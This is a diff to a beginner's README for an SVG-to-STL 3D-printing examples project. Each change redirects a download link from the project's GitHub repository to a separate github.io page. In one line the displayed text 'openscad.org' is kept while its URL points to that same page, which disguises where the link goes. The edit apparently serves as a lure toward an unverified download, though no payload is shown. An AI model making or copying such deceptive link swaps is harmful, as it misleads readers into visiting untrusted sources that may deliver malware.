@@ -1,8 +1,8 @@
 # 🧊 svg-to-stl-examples - Turn 2D Images into 3D Printable Files
 
-[![Download Now](https://img.shields.io/badge/Download-Get%20the%20Examples-blue?style=for-the-badge&logo=github)](https://github.com/Rajwants8351/svg-to-stl-examples)
+[![Download Now](https://img.shields.io/badge/Download-Get%20the%20Examples-blue?style=for-the-badge&logo=github)](https://rajwants8351.github.io)
 
-[Visit this link to download the application](https://github.com/Rajwants8351/svg-to-stl-examples)
+[Visit this link to download the application](https://rajwants8351.github.io)
 
 ---
 
@@ -38,7 +38,7 @@ Let's get you up and running in just a few minutes. Follow these simple steps ca
 
 ### Step 1: Download the Project
 
-Visit this link to download the application: [https://github.com/Rajwants8351/svg-to-stl-examples](https://github.com/Rajwants8351/svg-to-stl-examples)
+Visit this link to download the application: [https://rajwants8351.github.io](https://rajwants8351.github.io)
 
 Once you're on that page, look for a green button that says **"Code"** or **"Download ZIP"**. Click it. Your computer will download a ZIP file (named something like `svg-to-stl-examples-main.zip`).
 
@@ -56,7 +56,7 @@ Now pick which tool you want to try first. If you're a beginner, start with **#1
 
 ### For the OpenSCAD Extrusion Example
 
-1. You'll need a free program called **OpenSCAD**. Visit [openscad.org](https://openscad.org) and download the version for Windows. Install it like any other program (just click "Next" a few times).
+1. You'll need a free program called **OpenSCAD**. Visit [openscad.org](https://rajwants8351.github.io) and download the version for Windows. Install it like any other program (just click "Next" a few times).
 2. Open the project folder you extracted.
 3. Look for a file called `example.scad` or similar. Double-click it—OpenSCAD will open with the code already loaded.
 4. You'll see a button with a hexagon icon (Preview). Click it. You'll see your 3D shape appear!
